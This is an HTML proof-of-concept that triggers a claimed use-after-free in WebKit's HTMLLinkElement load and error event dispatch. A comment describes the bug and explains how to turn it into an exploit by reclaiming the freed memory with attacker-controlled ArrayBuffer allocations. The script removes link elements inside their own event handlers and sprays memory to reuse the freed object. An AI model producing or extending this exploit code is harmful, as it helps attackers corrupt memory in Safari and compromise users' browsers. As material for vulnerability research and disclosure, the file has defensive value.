<!--
  WebKit HTMLLinkElement::dispatchPendingEvent UAF PoC
  
  Bug: HTMLLinkElement::dispatchPendingEvent() at HTMLLinkElement.cpp:696 calls
  dispatchEvent() without holding a Ref to protect 'this'. The EventSender resolves
  a WeakPtr to a raw pointer before calling dispatchPendingEvent(). If the JS event
  handler removes the <link> from the DOM and drops all references, the element can
  be freed while dispatch is still on the stack.
  
  Compare with the ImageLoader fix (48cd5ac71dd / bug 318348) which added
  Ref protectedElement = element() before dispatch. HTMLLinkElement was not patched.
  
  Test: Load this in Safari (WebKit). The <link> load event fires when the
  stylesheet loads. The handler removes the link from the DOM, nulls all references,
  and triggers GC. If the UAF is exploitable, this crashes in the EventSender
  dispatch loop or in HTMLLinkElement member access after dispatchEvent returns.
  
  For exploitation: replace the GC trigger with controlled allocation (ArrayBuffer
  of sizeof(HTMLLinkElement)) to reclaim freed memory with attacker data.
-->
<!DOCTYPE html>
<html>
<head>
<title>HTMLLinkElement dispatchPendingEvent UAF PoC</title>
</head>
<body>
<h2>HTMLLinkElement UAF - Load Event Dispatch Without Ref Protection</h2>
<pre id="log"></pre>
<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
    console.log(msg);
}

// Phase 1: Create a <link> element that will fire a load event
var link = document.createElement('link');
link.rel = 'stylesheet';
// Use a real stylesheet URL - a data: URI works for triggering load
link.href = 'data:text/css,body{color:red}';

// Phase 2: Attach load event handler that removes the element
link.addEventListener('load', function(e) {
    log('[*] Load event fired on <link>');
    
    // Remove from DOM - drops the DOM tree's reference
    if (link.parentNode) {
        link.parentNode.removeChild(link);
        log('[*] Removed <link> from DOM');
    }
    
    // Clear JS reference
    link = null;
    log('[*] Cleared JS reference');
    
    // Aggressive GC to free the element while dispatch is still on stack
    // WebKit's GC can be triggered by allocation pressure
    var spray = [];
    for (var i = 0; i < 10000; i++) {
        spray.push(new ArrayBuffer(256)); // ~sizeof(HTMLLinkElement)
    }
    log('[*] GC pressure applied with ' + spray.length + ' allocations');
    
    // If we reach here without crash, the WeakPtr in EventSender may have
    // caught the destruction. But the raw pointer inside dispatchPendingEvent
    // was already dereferenced before we got here.
    log('[*] Handler completed - if no crash, the element may still be alive');
    log('[*] due to an internal ref. Check ASAN/valgrind for UAF.');
    
    // Clean up spray
    spray = null;
});

// Phase 3: Also test error event path
var link2 = document.createElement('link');
link2.rel = 'stylesheet';
link2.href = 'https://nonexistent.invalid/style.css'; // will fail -> error event

link2.addEventListener('error', function(e) {
    log('[*] Error event fired on <link>');
    
    if (link2.parentNode) {
        link2.parentNode.removeChild(link2);
        log('[*] Removed error <link> from DOM');
    }
    link2 = null;
    
    // GC pressure
    var spray2 = [];
    for (var i = 0; i < 10000; i++) {
        spray2.push(new ArrayBuffer(256));
    }
    log('[*] GC pressure on error path');
    spray2 = null;
});

// Phase 4: Add both to DOM to trigger loading
document.head.appendChild(link);
document.head.appendChild(link2);
log('[+] PoC loaded. Waiting for <link> load/error events...');
log('[+] Run under ASAN-enabled WebKit for UAF detection.');
log('[+] Expected: crash or ASAN report in EventSender::dispatchPendingEvents');
</script>
</body>
</html>
